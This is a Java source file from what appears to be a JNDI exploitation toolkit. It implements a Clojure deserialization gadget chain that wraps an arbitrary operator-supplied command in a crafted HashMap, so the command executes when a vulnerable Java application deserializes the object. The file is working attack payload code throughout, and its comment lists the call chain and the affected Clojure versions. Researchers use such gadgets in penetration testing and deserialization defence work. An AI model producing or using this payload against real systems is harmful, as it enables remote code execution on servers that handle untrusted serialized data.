package com.nu1r.jndi.gadgets;

import clojure.core$comp;
import clojure.core$constantly;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import clojure.main$eval_opt;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.clojure.ClojureUtil;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 * HashMap.readObject()
 * AbstractTableModel$ff19274a.hashCode()
 * clojure.core$comp$fn__4727.invoke()
 * clojure.core$constantly$fn__4614.invoke()
 * clojure.main$eval_opt.invoke()
 * <p>
 * Requires:
 * org.clojure:clojure
 * Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
 */
public class Clojure implements ObjectPayload<Map<?, ?>>{

    public Map<?, ?> getObject(PayloadType type, String... param) throws Exception {
        String              command        = param[0];
        String              clojurePayload = ClojureUtil.makeClojurePayload(command);
        Map<String, Object> fnMap          = new HashMap<>();
        fnMap.put("hashCode", (new core$constantly()).invoke(0));
        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
        HashMap<Object, Object> targetMap = new HashMap<>();
        targetMap.put(model, null);
        fnMap.put("hashCode", (new core$comp())
                .invoke(new main$eval_opt(), (new core$constantly())
                        .invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
        return targetMap;
    }

}
